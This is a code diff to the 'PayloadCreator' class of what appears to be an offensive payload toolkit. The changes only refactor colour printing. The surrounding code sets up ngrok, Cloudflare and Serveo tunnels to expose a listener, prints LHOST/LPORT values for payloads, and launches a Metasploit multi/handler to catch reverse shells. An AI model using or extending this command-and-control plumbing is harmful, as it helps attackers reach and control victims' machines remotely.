@@ -1,3 +1,5 @@
+from modules.utils import Colors
+
 import os
 import subprocess
 import requests
@@ -11,6 +13,7 @@ from cryptography.fernet import Fernet
 class PayloadCreator:
     def __init__(self, db):
         self.db = db
+        self.colors = Colors()
         self.output_dir = "output/payloads"
         os.makedirs(self.output_dir, exist_ok=True)
         self.ngrok_process = None
@@ -439,8 +442,8 @@ if __name__ == "__main__":
                         ngrok_host = public_url.split("//")[1].split(":")[0]
                         ngrok_port = public_url.split(":")[-1]
                         
-                        print(f"{Colors().GREEN}[+] Ngrok URL: {public_url}{Colors().ENDC}")
-                        print(f"{Colors().GREEN}[+] Use: LHOST={ngrok_host}, LPORT={ngrok_port}{Colors().ENDC}")
+                        print(f"{self.colors.GREEN}[+] Ngrok URL: {public_url}{self.colors.ENDC}")
+                        print(f"{self.colors.GREEN}[+] Use: LHOST={ngrok_host}, LPORT={ngrok_port}{self.colors.ENDC}")
                         
                         return ngrok_host, ngrok_port
             except:
@@ -449,7 +452,7 @@ if __name__ == "__main__":
             return "0.tcp.ngrok.io", lport
             
         except Exception as e:
-            print(f"{Colors().RED}[!] Ngrok error: {e}{Colors().ENDC}")
+            print(f"{self.colors.RED}[!] Ngrok error: {e}{self.colors.ENDC}")
             return None, None
     
     def setup_cloudflare_tunnel(self, lport, token):
@@ -464,13 +467,13 @@ if __name__ == "__main__":
             )
             
             time.sleep(3)
-            print(f"{Colors().GREEN}[+] CloudFlare tunnel started{Colors().ENDC}")
-            print(f"{Colors().YELLOW}[*] Note: Configure CloudFlare dashboard for custom domains{Colors().ENDC}")
+            print(f"{self.colors.GREEN}[+] CloudFlare tunnel started{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] Note: Configure CloudFlare dashboard for custom domains{self.colors.ENDC}")
             
             return f"your-domain.trycloudflare.com", lport
             
         except Exception as e:
-            print(f"{Colors().RED}[!] CloudFlare error: {e}{Colors().ENDC}")
+            print(f"{self.colors.RED}[!] CloudFlare error: {e}{self.colors.ENDC}")
             return None, None
     
     def setup_serveo(self, lport):
@@ -484,13 +487,13 @@ if __name__ == "__main__":
             )
             
             time.sleep(3)
-            print(f"{Colors().GREEN}[+] Serveo started{Colors().ENDC}")
-            print(f"{Colors().YELLOW}[*] Check output for assigned URL{Colors().ENDC}")
+            print(f"{self.colors.GREEN}[+] Serveo started{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] Check output for assigned URL{self.colors.ENDC}")
             
             return f"{lport}.serveo.net", lport
             
         except Exception as e:
-            print(f"{Colors().RED}[!] Serveo error: {e}{Colors().ENDC}")
+            print(f"{self.colors.RED}[!] Serveo error: {e}{self.colors.ENDC}")
             return None, None
     
     def start_multi_handler(self, lport):
@@ -507,7 +510,7 @@ exploit -j
         with open("handler.rc", "w") as f:
             f.write(handler_script)
         
-        print(f"{Colors().GREEN}[*] Starting multi/handler on port {lport}{Colors().ENDC}")
+        print(f"{self.colors.GREEN}[*] Starting multi/handler on port {lport}{self.colors.ENDC}")
         subprocess.Popen(["msfconsole", "-r", "handler.rc"])
     
     def calculate_hash(self, filepath):
